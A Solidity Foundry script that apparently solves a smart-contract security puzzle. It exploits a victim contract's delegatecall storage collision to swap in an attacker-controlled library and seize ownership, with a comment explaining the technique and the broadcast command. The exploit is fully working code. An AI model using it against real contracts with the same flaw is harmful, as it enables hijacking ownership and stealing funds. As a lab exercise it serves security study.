// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "../lib/forge-std/src/Script.sol";
import {HelperConfigLib} from "./config/HelperConfig.sol";

contract PreservationAttacker is Script, HelperConfigLib {
    function run(address _victimAddr) external {
        vm.startBroadcast();

        FakeTimeZoneContract fkTmZnContr = new FakeTimeZoneContract();

        (bool success, ) = _victimAddr.call(
            abi.encodeWithSignature(
                "setFirstTime(uint256)",
                uint256(uint160(address(fkTmZnContr)))
            )
        );
        require(success == true);

        (bool attack_success, ) = _victimAddr.call(
            abi.encodeWithSignature(
                "setFirstTime(uint256)",
                uint256(uint160(ATTACKER_ADDRESS))
            )
        );
        require(attack_success == true);

        vm.stopBroadcast();
    }
}

contract FakeTimeZoneContract {
    address slot1;
    address slot2;
    address owner;

    function setTime(uint256 playerAddr) public {
        owner = address(uint160(playerAddr));
    }
}

/**
 * The victim is using delegatecall to call the timezoneLibrary instances instead of using `call()`. bcz delegatecall execute the logic of the proxy contract but stores the value in its contract storage. 
 * So if you call setFirstTime it gonna change the storage slot #0 which is timeZone1Library-Address
 * Change the timeZone1Library-Address to a Contract that we control and use our Contract to claim Ownership of that Contract by changing storage slot #3 to player Address.


 * forge script script/PreservationAttacker.s.sol:PreservationAttacker --sig "run(address)" <VICTIM-ADDRESS> --rpc-url http://localhost:8545 -vvv --broadcast --private-key <PRIVATE-KEY>
*/
